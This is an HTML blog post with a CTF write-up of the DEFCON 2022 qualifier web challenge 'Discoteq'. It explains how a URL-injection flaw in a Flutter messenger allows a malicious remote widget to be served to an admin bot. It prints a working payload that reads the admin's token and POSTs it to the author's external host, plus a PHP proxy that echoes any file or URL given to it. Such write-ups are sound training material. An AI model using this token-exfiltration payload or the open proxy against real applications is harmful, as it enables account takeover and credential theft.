@@ -1,0 +1,127 @@
+<!doctype html><html lang=en><head><meta charset=utf-8><meta http-equiv=x-ua-compatible content="IE=edge"><meta name=viewport content="width=device-width,initial-scale=1"><title>[Discoteq] Write Up CTF DEFCON Qualification 2022 | nyxsorcerer notes</title><link rel=stylesheet href=https://nyxsorcerer.github.io/assets/css/post.css><script defer src=https://nyxsorcerer.github.io/assets/js/lbox.js></script>
+<script defer src=https://nyxsorcerer.github.io/assets/js/main.js></script>
+<link rel=stylesheet href=https://nyxsorcerer.github.io/assets/css/common.css></head><body style=overflow-x:hidden><main><header><a class=site-title href=https://nyxsorcerer.github.io/>nyxsorcerer notes</a></header><section class=article><div class=article-header><h2 class=article-title>[Discoteq] Write Up CTF DEFCON Qualification 2022</h2><small class=date>Sun May 22, 2022</small><div class=tags><a href=https://nyxsorcerer.github.io/tags/CTF class=tag>CTF</a>
+<a href=https://nyxsorcerer.github.io/tags/Write-up class=tag>Write-up</a>
+<a href=https://nyxsorcerer.github.io/tags/nyxsorcerer class=tag>nyxsorcerer</a></div></div><div class=content><h2 id=prologue>Prologue</h2><p>DEFCON CTF is one of the world&rsquo;s largest and most notable hacker conventions. The Finalist will get a free ticket to attend the conference in Las Vegas. This year, the organizer for this competition is Nautilus Institute (it&rsquo;s oooverflow in the past). DEFCON CTF lasts for 48 hours with 18 + 2 (warm-up) challenges.</p><h2 id=write-up>Write Up</h2><h3 id=discoteq-100pts>Discoteq (100pts)</h3><h4 id=tldr-solution>TL;DR Solution</h4><p>The vulnerability of this challenge is we could change the URL for the remote widget to our host. So, we could create a malicious widget to create a widget and the application will deserialize our malicious widget.</p><h4 id=detailed-explanation>Detailed Explanation</h4><p>The value of this challenge is 100 points and more than +30 players have solved this challenge.</p><p><img src=images/discoteq-1.png alt></p><p>We were given a website with given a desktop application. After seeing the desktop application, we could see the website is made with Flutter.</p><p><img src=images/discoteq-2.png alt></p><p>The contents of README.txt is below.</p><pre tabindex=0><code>Discoteq! 
+Introducing the newest easy, anonymous, secure, desktop messager app! 
+ 
+Ps. There is no point in reversing this desktop binary, it is running the same code as the web app.
+</code></pre><p>Based on the information above, We concluded there&rsquo;s no need to reverse-engineering the binary. So, we could analyze the javascript instead of reading the binary, and also, the desktop application should have the same code since it&rsquo;s written with flutter.</p><p>After skimming through line by line, We found a unique thing.</p><p><img src=images/discoteq-3.png alt></p><p>In those lines, there&rsquo;s a check where the URL is using the prefix https/http and the check is the suffix using image extension. And at the same time, the function name is <code>_sendChat$body$_HomePageState(targets)</code>. So, we assume this is a function where checking the body message.</p><p>So, we just sent a message with the exact condition needed.</p><p><img src=images/discoteq-4.png alt></p><p>As we can see, our message will generate an image. So, we attempted to send a message to check the admin bot.</p><p><img src=images/discoteq-5.png alt></p><p>Nice, we received a callback from the bot. Given the user agent, We could assume the bot is running on the desktop application instead of the browser.</p><p>What is the next step? We read, debug, and guess the challenge once again, and also gather the information as much as available.</p><p>After playing around with the WebSocket traffics, We got an interesting error during a poll creation.</p><p><img src=images/discoteq-6.png alt></p><p><img src=images/discoteq-7.png alt></p><p>As we can see in the console log, We could see we were able to control the <code>widget</code> parameter (<code>data.apiGet</code> and <code>data.apiPost</code> too, but it&rsquo;s not involved with our write-up). Referring to <a href=https://datatracker.ietf.org/doc/html/rfc1738#section-3.1>URL RFC</a>, If we put <code>@domain.com</code> as our payload, It will change into <code>iscoteq-thl53at4nuzlm.shellweplayaga.me@domain.com</code> so it will change the remote domain into credentials authorization and sending a request to our domain instead.</p><p>But what is this at the <code>/widget/*</code> endpoint?.</p><p><img src=images/discoteq-8.png alt></p><p>with our <code>google-fu</code> technique, we obtain a clue where it&rsquo;s related to <code>rfw</code> or <code>Remote Flutter Widget</code>. <a href=https://github.com/flutter/packages/tree/main/packages/rfw>Github</a>, <a href=https://pub.dev/documentation/rfw/latest/index.html>Documentation</a></p><p><img src=images/discoteq-9.png alt></p><p>And with the power of reading the example and the documentation, we found out how to decode the widget using <a href=https://pub.dev/documentation/rfw/latest/formats/decodeLibraryBlob.html><code>decodeLibraryBlob</code></a>.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-dart data-lang=dart><span style=display:flex><span><span style=color:#66d9ef>import</span> <span style=color:#e6db74>&#39;dart:io&#39;</span>; 
+</span></span><span style=display:flex><span><span style=color:#66d9ef>import</span> <span style=color:#e6db74>&#39;package:rfw/formats.dart&#39;</span>; 
+</span></span><span style=display:flex><span> 
+</span></span><span style=display:flex><span><span style=color:#66d9ef>void</span> main() { 
+</span></span><span style=display:flex><span> <span style=color:#66d9ef>var</span> poll <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> File(<span style=color:#e6db74>&#39;poll&#39;</span>).readAsBytesSync(); 
+</span></span><span style=display:flex><span> print(decodeLibraryBlob(poll)); 
+</span></span><span style=display:flex><span>}
+</span></span></code></pre></div><p><img src=images/discoteq-10.png alt></p><p>We successfully decoded the widget. Unfortunately, it is not perfectly working to re-encode the file (the <a href=https://github.com/flutter/packages/tree/main/packages/rfw/example/remote/remote_widget_libraries>encode.dart</a> is already provided in the example repository). So we tried to little bit patching the bug.</p><p>(We take /widget/poll for example)</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-dart data-lang=dart><span style=display:flex><span><span style=color:#66d9ef>import</span> core<span style=color:#960050;background-color:#1e0010>.</span>widgets;
+</span></span><span style=display:flex><span><span style=color:#66d9ef>import</span> core<span style=color:#960050;background-color:#1e0010>.</span>material;
+</span></span><span style=display:flex><span><span style=color:#66d9ef>import</span> local;
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>widget root <span style=color:#f92672>=</span> Container(
+</span></span><span style=display:flex><span>  
+</span></span><span style=display:flex><span>    child: Column(
+</span></span><span style=display:flex><span>      children: [
+</span></span><span style=display:flex><span>        Row(
+</span></span><span style=display:flex><span>          children: [
+</span></span><span style=display:flex><span>            Text(text: <span style=color:#e6db74>&#34;From &#34;</span> ), 
+</span></span><span style=display:flex><span>            Text(
+</span></span><span style=display:flex><span>              text: data.author.user, 
+</span></span><span style=display:flex><span>              style: {color: <span style=color:#ae81ff>4278230474</span>}
+</span></span><span style=display:flex><span>            )
+</span></span><span style=display:flex><span>          ]
+</span></span><span style=display:flex><span>        ), 
+</span></span><span style=display:flex><span>          Padding(
+</span></span><span style=display:flex><span>            padding: [<span style=color:#ae81ff>0.0</span>, <span style=color:#ae81ff>5.0</span>, <span style=color:#ae81ff>0.0</span>, <span style=color:#ae81ff>0.0</span>], 
+</span></span><span style=display:flex><span>            child: Text(text: data.data.title)
+</span></span><span style=display:flex><span>          ), 
+</span></span><span style=display:flex><span>          <span style=color:#66d9ef>switch</span> state.loaded {
+</span></span><span style=display:flex><span>            <span style=color:#66d9ef>true</span><span style=color:#f92672>:</span> Column(
+</span></span><span style=display:flex><span>              children: [
+</span></span><span style=display:flex><span>                ...<span style=color:#66d9ef>for</span> loop <span style=color:#66d9ef>in</span> data.poll_options: 
+</span></span><span style=display:flex><span>                  Row(
+</span></span><span style=display:flex><span>                    children: [
+</span></span><span style=display:flex><span>                      Padding(
+</span></span><span style=display:flex><span>                        child: 
+</span></span><span style=display:flex><span>                          ElevatedButton(
+</span></span><span style=display:flex><span>                            child: Text(text: loop.text), 
+</span></span><span style=display:flex><span>                            onPressed: event <span style=color:#e6db74>&#34;api_post&#34;</span> {path: data.data.apiVote, body: {selection: loop.text}}
+</span></span><span style=display:flex><span>                          ), 
+</span></span><span style=display:flex><span>                        padding: [<span style=color:#ae81ff>0.0</span>, <span style=color:#ae81ff>5.0</span>, <span style=color:#ae81ff>10.0</span>, <span style=color:#ae81ff>0.0</span>]
+</span></span><span style=display:flex><span>                      ), Text(text: loop.count)
+</span></span><span style=display:flex><span>                    ]
+</span></span><span style=display:flex><span>                  ), TextButton(
+</span></span><span style=display:flex><span>                    child: 
+</span></span><span style=display:flex><span>                      Text(text: <span style=color:#e6db74>&#34;Refresh&#34;</span>, style: {color: <span style=color:#ae81ff>4294942366</span>}), 
+</span></span><span style=display:flex><span>                      onPressed: [<span style=color:#66d9ef>set</span> state.loaded <span style=color:#f92672>=</span> <span style=color:#66d9ef>false</span>]
+</span></span><span style=display:flex><span>                    )]
+</span></span><span style=display:flex><span>              ), 
+</span></span><span style=display:flex><span>            <span style=color:#66d9ef>false</span><span style=color:#f92672>:</span> ApiMapper(
+</span></span><span style=display:flex><span>              url: data.data.apiGet,
+</span></span><span style=display:flex><span>              jsonKey: <span style=color:#e6db74>&#34;options&#34;</span>, 
+</span></span><span style=display:flex><span>              dataKey: <span style=color:#e6db74>&#34;poll_options&#34;</span>, 
+</span></span><span style=display:flex><span>              onLoaded: [<span style=color:#66d9ef>set</span> state.loaded <span style=color:#f92672>=</span> <span style=color:#66d9ef>true</span>]
+</span></span><span style=display:flex><span>            )
+</span></span><span style=display:flex><span>          }
+</span></span><span style=display:flex><span>        ]
+</span></span><span style=display:flex><span>      
+</span></span><span style=display:flex><span>    )
+</span></span><span style=display:flex><span>  
+</span></span><span style=display:flex><span>);
+</span></span></code></pre></div><p>Even though we successfully re-encode the compiled file. For some reason, it still doesn&rsquo;t work on remote. So, we tried to re-code it with a basic widget functionality, and it surprisingly worked.</p><p><img src=images/discoteq-11.png alt></p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-dart data-lang=dart><span style=display:flex><span><span style=color:#66d9ef>import</span> core<span style=color:#960050;background-color:#1e0010>.</span>widgets;
+</span></span><span style=display:flex><span><span style=color:#66d9ef>import</span> core<span style=color:#960050;background-color:#1e0010>.</span>material;
+</span></span><span style=display:flex><span><span style=color:#66d9ef>import</span> local;
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>widget root <span style=color:#f92672>=</span> Container(
+</span></span><span style=display:flex><span>    child: Column(
+</span></span><span style=display:flex><span>      children: [
+</span></span><span style=display:flex><span>        Row(
+</span></span><span style=display:flex><span>          children: [
+</span></span><span style=display:flex><span>            Text(text: <span style=color:#e6db74>&#34;sss &#34;</span> ), 
+</span></span><span style=display:flex><span>          ]
+</span></span><span style=display:flex><span>        ),  
+</span></span><span style=display:flex><span>      ]
+</span></span><span style=display:flex><span>    )
+</span></span><span style=display:flex><span>);
+</span></span></code></pre></div><p>Our next todo is setting up the webserver to make a host for our compiled widget.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-php data-lang=php><span style=display:flex><span><span style=color:#f92672>&lt;?</span><span style=color:#a6e22e>php</span> 
+</span></span><span style=display:flex><span><span style=color:#a6e22e>header</span>(<span style=color:#e6db74>&#39;Access-Control-Allow-Origin: *&#39;</span>); 
+</span></span><span style=display:flex><span><span style=color:#66d9ef>echo</span> <span style=color:#a6e22e>file_get_contents</span>($_GET[<span style=color:#e6db74>&#39;x&#39;</span>]); 
+</span></span><span style=display:flex><span><span style=color:#75715e>?&gt;</span><span style=color:#960050;background-color:#1e0010>
+</span></span></span></code></pre></div><p>Our compiled widget is running perfectly.</p><p><img src=images/discoteq-12.png alt></p><p><img src=images/discoteq-13.png alt></p><p>Ps. Every we make a widget request, it will be cached. So you need to refresh the page every time you create a new widget.</p><p>Since the bot visits our message, we make a bold assumption that we need to write a javascript in the message. Reading the flutter documentation, trying to import packages, and many more. But, there&rsquo;s nothing that is working. And, It took many hours to realize that we were actually on the wrong track.</p><p>We realize this after re-reading the decompiled widget, there&rsquo;s an <code>ApiMapper</code> function. We searched the documentation and didn&rsquo;t find anything. That means this is a custom function. So, we read the javascript (again).</p><p><img src=images/discoteq-14.png alt></p><p>We tried debugging and find that snippet code. Based on our understanding, and comparing our decoded widget, we assume <code>ApiMapper</code> is take parameters <code>"url"</code>, <code>"jsonKey"</code>, <code>"dataKey"</code>, and <code>"onLoaded"</code>.</p><p><img src=images/discoteq-15.png alt></p><p>And Our next finding of debugging is that snippet above. As we can see, at function <code>_loadRequest$body$_ApiMapperState(api_url)</code> it will be doing a magical thing where it will create a request and at case 2, it will get the response and put it to <code>$async$self._main$_result</code> variable.</p><p><img src=images/discoteq-16.png alt></p><p>And here is another next finding during debugging. At function <code>_updateIfReady$0()</code> is doing another magical thing. The gist of it is <code>t1</code> variable will store the response we got at <code>$async$self._main$_result</code> before.</p><p>After that, the variable <code>resultForKey</code> is tried to get the value of object <code>t1</code> using <code>jsonKey</code> at the widget. So, the variable of <code>resultForKey</code> actually stores the value of the key (<code>jsonKey</code>) the response at widget <code>url</code>.</p><p>After that, the <code>resultForKey</code> will be doing a loop and put it at the <code>values</code> variable. And then, at <code>_this._main$_data.update$2(0, _this._widget.dataKey, values);</code> it means the application will update the <code>data</code> at the widget using the <code>dataKey</code> parameter at <code>ApiMapper</code> before. It will store the response. And thanks to that, we could access the <code>dataKey</code> via widget.</p><p>And the last thing is the <code>onLoaded</code> is doing a similar thing with the <code>onload</code> at javascript html event but it will be executed after the GET request is finished.</p><p>Since we already &ldquo;a little bit&rdquo; understand how the application work, we could create a widget using <code>ApiMapper</code> now.</p><p>But, there&rsquo;s another problem now. How do we know the response with those limitations?. While the widget deserialization is all done on the client-side. Not to mention, another limitation of <code>ApiMapper</code> is only making GET requests.</p><p>We are back at the decompiled widget before. At the <code>ElevatedButton</code> function, there&rsquo;s a key <code>onPressed</code> which has similar behavior to <code>onClick</code> at javascript html. It will invoke a registered event with the name <code>api_post</code>. So, based on the decompiled widget, we could pass the variable data to that event.</p><p><img src=images/discoteq-17.png alt></p><p>So, we back to the compiled javascript (again). With the snippet code above, we could assume it&rsquo;s just checking the event name and making a POST request to the given URL and body.</p><p>All the problem is already resolved. Our next step is crafting the payload.</p><p><code>payload.rfwtxt</code></p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-dart data-lang=dart><span style=display:flex><span><span style=color:#66d9ef>import</span> core<span style=color:#960050;background-color:#1e0010>.</span>widgets;
+</span></span><span style=display:flex><span><span style=color:#66d9ef>import</span> core<span style=color:#960050;background-color:#1e0010>.</span>material;
+</span></span><span style=display:flex><span><span style=color:#66d9ef>import</span> local;
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>widget root <span style=color:#f92672>=</span> Container(
+</span></span><span style=display:flex><span>    child: Column(
+</span></span><span style=display:flex><span>      children: [
+</span></span><span style=display:flex><span>        Row(
+</span></span><span style=display:flex><span>          children: [
+</span></span><span style=display:flex><span>            Text(text: <span style=color:#e6db74>&#34;From &#34;</span> ), 
+</span></span><span style=display:flex><span>            Text(text: data.author.user, style: {color: <span style=color:#ae81ff>4278230474</span>}),
+</span></span><span style=display:flex><span>            ApiMapper(
+</span></span><span style=display:flex><span>              url: <span style=color:#e6db74>&#34;/api/token&#34;</span>,
+</span></span><span style=display:flex><span>              jsonKey: <span style=color:#e6db74>&#34;new_token&#34;</span>,
+</span></span><span style=display:flex><span>              dataKey: <span style=color:#e6db74>&#34;user_token&#34;</span>,
+</span></span><span style=display:flex><span>              onLoaded: [<span style=color:#66d9ef>true</span>]
+</span></span><span style=display:flex><span>            ),
+</span></span><span style=display:flex><span>            
+</span></span><span style=display:flex><span>            ApiMapper(
+</span></span><span style=display:flex><span>              url: <span style=color:#e6db74>&#34;@x.nyxmare.co:1234/&#34;</span>,
+</span></span><span style=display:flex><span>              jsonKey: <span style=color:#e6db74>&#34;something&#34;</span>,
+</span></span><span style=display:flex><span>              dataKey: <span style=color:#e6db74>&#34;something&#34;</span>,
+</span></span><span style=display:flex><span>              onLoaded: [event <span style=color:#e6db74>&#34;api_post&#34;</span> {path: <span style=color:#e6db74>&#34;@x.nyxmare.co:1234/log.php&#34;</span>, body: {from: <span style=color:#e6db74>&#34;ApiMapper 2&#34;</span>, ticket: data.user_token}}]
+</span></span><span style=display:flex><span>            ),
+</span></span><span style=display:flex><span>          ]
+</span></span><span style=display:flex><span>        ),  
+</span></span><span style=display:flex><span>      ]
+</span></span><span style=display:flex><span>    )
+</span></span><span style=display:flex><span>);
+</span></span></code></pre></div><p>We&rsquo;re going to explain this. The first <code>ApiMapper</code> will make a GET request at <code>/api/toke</code>.</p><p><img src=images/discoteq-18.png alt></p><p>As we can see from the response of that endpoint, it has a <code>new_token</code> key with the value of the current token user. After that, the <code>ApiMapper</code> will set the <code>data</code> at widget (<code>user_token</code>) with the value of <code>jsonKey</code> from the response (<code>new_token</code>). And the <code>onLoaded</code> part is just doing nothing.</p><p>And for the 2nd <code>ApiMapper</code> will make a GET request to our host.</p><p><img src=images/discoteq-19.png alt></p><p><code>index.php</code></p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-php data-lang=php><span style=display:flex><span><span style=color:#f92672>&lt;?</span><span style=color:#a6e22e>php</span> 
+</span></span><span style=display:flex><span> 
+</span></span><span style=display:flex><span><span style=color:#a6e22e>sleep</span>(<span style=color:#ae81ff>3</span>); 
+</span></span><span style=display:flex><span> 
+</span></span><span style=display:flex><span><span style=color:#a6e22e>header</span>(<span style=color:#e6db74>&#39;Access-Control-Allow-Origin: *&#39;</span>); 
+</span></span><span style=display:flex><span><span style=color:#a6e22e>header</span>(<span style=color:#e6db74>&#39;Content-Type: application/json&#39;</span>); 
+</span></span><span style=display:flex><span> 
+</span></span><span style=display:flex><span><span style=color:#75715e>?&gt;</span><span style=color:#960050;background-color:#1e0010> 
+</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>{&#34;something&#34;:&#34;nice&#34;}
+</span></span></span></code></pre></div><p>As we can see from the response of that endpoint, it is doing the same thing as the first. But the difference between the first is doing a <code>sleep</code> to give a time to the first <code>ApiMapper</code> finished to setting up <code>data</code> (We actually spend many hours at this part, and wondering why it rarely works. We also tried to spam bot and make hope it will work). So, after that, it will be an <code>onLoaded</code> event, where it&rsquo;s used for passing and sending the <code>data</code> widget to our log.</p><p>Ps. We actually tried to make only one <code>ApiMapper</code>, but for some reason, The <code>data</code> widget won&rsquo;t be updated during <code>onLoaded</code> ¯_(ツ)_/¯.</p><p>We already finished crafting the payload. The final step will be just to send a poll with our malicious widget.</p><p><img src=images/discoteq-20.png alt></p><p><img src=images/discoteq-21.png alt></p><p><img src=images/discoteq-22.png alt></p><p>Finally, we obtain the token admin. So, the final step is just to request the <code>/api/flag</code> with the token we got.</p><p><img src=images/discoteq-23.png alt></p><h2 id=epilogue>Epilogue</h2><p>The challenges given are very fun. And also, This is actually the hardest web challenge that I could solve during the competition. We learn new things about flutter. <em>Kudos</em> to the author of the challenge for giving us an entertaining challenge.</p><p>— nyxsorcerer</p></div></section><footer><p>&copy; 2022</p></footer></main></body></html>
